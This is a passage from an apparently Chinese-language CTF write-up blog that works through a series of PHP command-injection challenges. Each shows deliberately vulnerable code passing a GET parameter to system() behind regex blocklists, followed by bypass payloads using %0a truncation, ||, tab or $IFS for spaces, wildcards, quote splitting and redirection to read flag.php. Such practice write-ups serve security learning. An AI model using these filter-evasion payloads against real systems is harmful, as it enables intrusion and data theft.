</span></span><span class="line"><span class="ln">38</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] result:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><p>将两个文件放在同一个文件夹，运行exp.py即可</p>
<p>羽师傅nb</p>
<p><img alt="image-20241124223329525" loading="lazy" src="../assets/image-20241124223329525.png"></p>
<blockquote>
<p>注意链接要用http不能用https</p></blockquote>
<h4 id="web42">web42<a hidden class="anchor" aria-hidden="true" href="#web42">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 20:51:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这道题会将我们输入的命令与<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>进行拼接</p>
<blockquote>
<p>/dev/null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显</p></blockquote>
<p>导致我们无法成功执行</p>
<p>我们可以通过<code>%0a</code>截断的方式绕过</p>
<blockquote>
<p>tac fl*%0a</p></blockquote>
<p>or</p>
<blockquote>
<p>; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
&amp; //两条命令都会执行
&amp;&amp; //两条命令都会执行</p>
<p>过滤了分号和cat，可以用||和&amp;来代替分号，tac代替cat</p>
<p>可构造playload:
url/?c=tac flag.php||
url/?c=tac flag.php%26
注意，这里的&amp;需要url编码</p></blockquote>
<h4 id="web43">web43<a hidden class="anchor" aria-hidden="true" href="#web43">#</a></h4>
<p>过滤了cat、；，</p>
<p>不是很影响</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac flag.php||

...
//记得转url编码
</code></pre><h4 id="web44">web44<a hidden class="anchor" aria-hidden="true" href="#web44">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:01
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/;|cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了<code>;|cat|flag</code></p>
<p>小问题</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac f*||

...
//记得转url编码
</code></pre><h4 id="web45">web45<a hidden class="anchor" aria-hidden="true" href="#web45">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:35:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| /i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了<code>;|cat|flag</code>和空格</p>
<p>可以用%09或$IFS$9代替空格</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

echo$IFS`tac$IFS*`%0A

...
//记得转url编码
</code></pre><h4 id="web46">web46<a hidden class="anchor" aria-hidden="true" href="#web46">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*/i&#34;, $c)){
        system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);
    }
}else{
    highlight_file(__FILE__);
}
</code></pre><p>过滤有点多啊</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*</p></blockquote>
<p>但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//记得转url编码
</code></pre><h4 id="web47">web47<a hidden class="anchor" aria-hidden="true" href="#web47">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:59:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤这么多O.o？</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail</p></blockquote>
<p>但是幸好我用的是tac</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//记得转url编码
</code></pre><h4 id="web48">web48<a hidden class="anchor" aria-hidden="true" href="#web48">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:06:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤更多了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`</p></blockquote>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
//记得转url编码
</code></pre><h4 id="web49">web49<a hidden class="anchor" aria-hidden="true" href="#web49">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:22:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%</p></blockquote>
<p>虽然过滤了%但是是不影响我们传入的url编码的</p>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
</code></pre><h4 id="web50">web50<a hidden class="anchor" aria-hidden="true" href="#web50">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:32:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\x09|\x26</p></blockquote>
<p>坏，没法用%09代替空格，没法用?代替字符</p>
<p>不过幸好还有&lt;和&rsquo;'</p>
<pre tabindex="0"><code>tac&lt;fla%27%27g.php||
or
tac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51">web51<a hidden class="anchor" aria-hidden="true" href="#web51">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:42:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26/</p></blockquote>
<p>怎么把我tac也过滤了</p>
<p>没事能绕过</p>
<pre tabindex="0"><code>t%27%27ac&lt;fla%27%27g.php||
or
t%27%27ac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51-1">web51<a hidden class="anchor" aria-hidden="true" href="#web51-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:50:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
